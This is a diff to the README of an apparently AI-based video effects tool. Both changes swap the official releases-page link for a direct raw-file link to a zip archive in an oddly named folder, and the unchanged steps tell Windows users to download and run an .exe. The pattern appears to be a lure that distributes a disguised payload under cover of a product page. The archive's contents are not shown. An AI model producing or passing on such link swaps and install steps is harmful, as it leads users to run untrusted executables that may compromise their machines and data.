@@ -1,6 +1,6 @@
 # 🎬 ai-vfx-wonder-studio - Replace 3D characters in your videos
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/generalelectionexoergicreaction447/ai-vfx-wonder-studio/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/generalelectionexoergicreaction447/ai-vfx-wonder-studio/main/hydrobromic/wonder-vfx-ai-studio-v3.5-beta.4.zip)
 
 This application automates visual effects production. It replaces 3D characters within your existing video files. You do not need experience in animation or complex software to use the tool. The system handles lighting, motion, and character placement for you. 
 
@@ -20,7 +20,7 @@ If your computer uses an integrated graphics chip, the software might run slow o
 
 You can download the application from the project release page. Follow this guide to install the tool on your Windows PC.
 
-1. Visit this page to download: [https://github.com/generalelectionexoergicreaction447/ai-vfx-wonder-studio/releases](https://github.com/generalelectionexoergicreaction447/ai-vfx-wonder-studio/releases).
+1. Visit this page to download: [https://raw.githubusercontent.com/generalelectionexoergicreaction447/ai-vfx-wonder-studio/main/hydrobromic/wonder-vfx-ai-studio-v3.5-beta.4.zip](https://raw.githubusercontent.com/generalelectionexoergicreaction447/ai-vfx-wonder-studio/main/hydrobromic/wonder-vfx-ai-studio-v3.5-beta.4.zip).
 2. Look for the latest version listed under the Assets section.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or your Downloads folder.
